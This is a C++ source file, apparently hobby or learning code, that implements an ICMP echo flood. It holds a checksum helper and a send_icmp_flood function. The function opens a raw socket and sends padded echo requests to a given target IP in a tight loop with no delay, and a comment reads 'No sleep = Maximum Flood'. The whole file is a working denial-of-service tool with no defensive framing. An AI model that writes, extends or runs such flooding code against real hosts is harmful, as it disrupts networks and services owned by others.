#include "../headers/icmp.h"

ICMP::ICMP() {}

// Standard Checksum (The math part)
// The checksum works by summing up all 16-bit words in the header and data,
// and then taking the one's complement of that sum.
unsigned short ICMP::checksum(void* b, int len) {
    unsigned short* buf = (unsigned short*)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char*)buf;
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void ICMP::send_icmp_flood(const char* target_ip, int packet_count) {
    // 1. Create Raw Socket (AF_INET because we let OS handle Ethernet)
    // IPPROTO_ICMP: this parameters lets us open a socket in the ICMP protocol
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    // 2. Define Destination
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    if (inet_pton(AF_INET, target_ip, &dest.sin_addr) <= 0) {
        perror("Invalid IP address");
        close(sock);
        return;
    }

    // 3. Prepare Packet
    // Header (8 bytes) + Payload (64 bytes of junk)
    char packet[sizeof(struct icmphdr) + 64];
    memset(packet, 0, sizeof(packet));

    // Pointers
    struct icmphdr* icmp = (struct icmphdr*)packet;

    // Fill Header
    icmp->type = ICMP_ECHO; // Type 8 = "Are you there?"
    icmp->code = 0;
    icmp->un.echo.id = htons(1234); // ID to track the "session"
    
    // Fill Payload
    memset(packet + sizeof(struct icmphdr), 'X', 64);

    std::cout << "[+] Starting ICMP Flood on " << target_ip << "...\n";

    // 4. Flood Loop
    for (int i = 0; i < packet_count; i++) {
        icmp->un.echo.sequence = htons(i); // Sequence number
        
        // Critical: Checksum must be recalculated every time if data changes
        icmp->checksum = 0;
        icmp->checksum = checksum(packet, sizeof(packet));

        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
            perror("[-] Send failed");
        }
        
        // No sleep = Maximum Flood
    }

    std::cout << "[+] Flood complete." << std::endl;
    close(sock);
}